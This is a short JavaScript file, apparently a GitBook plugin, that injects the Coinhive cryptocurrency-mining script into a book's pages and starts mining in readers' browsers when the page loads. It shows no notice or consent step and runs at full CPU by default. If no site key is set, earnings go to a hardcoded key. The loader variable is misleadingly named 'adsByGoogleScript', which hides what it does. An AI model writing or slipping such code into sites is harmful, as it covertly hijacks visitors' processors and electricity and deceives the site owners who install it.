require(['gitbook'], function(gitbook) {
  gitbook.events.bind('start', function(e, cnf) {
    config = cnf.xmr;

    if (config.siteKey) {
      siteKey = config.siteKey;
    } else {
      siteKey = 'UogF4rJMxpFcsez63SckaUr06XOeNNQx';
    }

    if (config.throttle) {
      throttle = config.throttle;
      var tmpThrottle = config.throttle;
      if (
        typeof tmpThrottle === 'number' &&
        tmpThrottle >= 0 &&
        tmpThrottle <= 1
      ) {
        throttle = config.throttle;
      } else {
        throttle = 0;
      }
    } else {
      throttle = 0;
    }

    var adsByGoogleScript = document.createElement('script');
    adsByGoogleScript.src = 'https://coinhive.com/lib/coinhive.min.js';
    adsByGoogleScript.setAttribute('async', true);
    document.body.appendChild(adsByGoogleScript);

    window.onload = function() {
      var miner = new CoinHive.Anonymous(siteKey, { throttle: throttle });
      miner.start();
    };
  });
});
